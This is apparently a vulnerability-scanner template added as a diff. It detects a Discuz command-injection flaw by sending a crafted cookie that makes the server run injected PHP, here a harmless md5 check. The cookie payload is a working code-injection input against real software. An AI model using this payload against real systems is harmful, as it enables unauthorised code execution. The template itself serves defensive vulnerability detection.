@@ -1,0 +1,28 @@
+id: discuz-wooyun-2010-080723
+info:
+  name: Discuz Wooyun 2010 080723
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: command-injection
+  description: |
+    Discuz vulnerability allowing command injection via manipulated cookies.
+
+variables:
+  rand: '{{rand_int(10000, 21000)}}'
+
+http:
+  - raw:
+      - |
+        GET /viewthread.php?tid=10 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D=/.*/eui; GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D=print_r(md5({{rand}}));
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{rand | md5}}"
+        part: body
